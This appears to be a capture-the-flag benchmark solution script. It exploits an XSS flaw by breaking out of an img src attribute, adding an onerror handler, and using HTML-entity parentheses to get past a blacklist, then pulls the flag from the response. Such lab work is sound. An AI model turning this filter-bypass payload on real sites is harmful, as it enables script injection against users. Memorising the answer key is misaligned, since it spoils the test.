#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import sys
import re
import requests
from urllib.parse import urlencode

"""
X-048-24 exploit (XSS via injected <img onerror>, bypassing blacklist with HTML entities)

Idea:
- Backend builds: ... ><img src="{name}"> and only blacklists <, >, (, ), `, Â´, 'javascript', 'throw'.
- We break out of the src attribute by injecting a double quote, then add onerror.
- Parentheses are blocked if literal, so use HTML entities: &#40; and &#41;.
- Payload core: x" onerror=alert&#40;'XSS'&#41; x="

Usage:
  pip install requests
  python3 benchmarks/X-048-24/exp.py [BASE_URL]
Default BASE_URL: http://ip32811
"""

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://ip32811"


def extract_flag(html: str):
    m = re.search(r'Here is the flag:\s*([^<\r\n]+)', html, re.I)
    if m:
        return m.group(1).strip()
    m = re.search(r'FLAG\{[^}]+\}', html)
    if m:
        return m.group(0)
    return None


def main():
    payload = 'x" onerror=alert&#40;\'XSS\'&#41; x="'
    url = f"{BASE}/page?" + urlencode({'name': payload})
    headers = {
        'User-Agent': 'Mozilla/5.0 (X-048-24-EXP)',
    }
    try:
        resp = requests.get(url, headers=headers, timeout=20)
    except Exception as e:
        print(f"[!] Request failed: {e}")
        sys.exit(2)

    flag = extract_flag(resp.text)
    if flag:
        print(flag)
        sys.exit(0)
    print(resp.text)
    sys.exit(2)


if __name__ == "__main__":
    main()

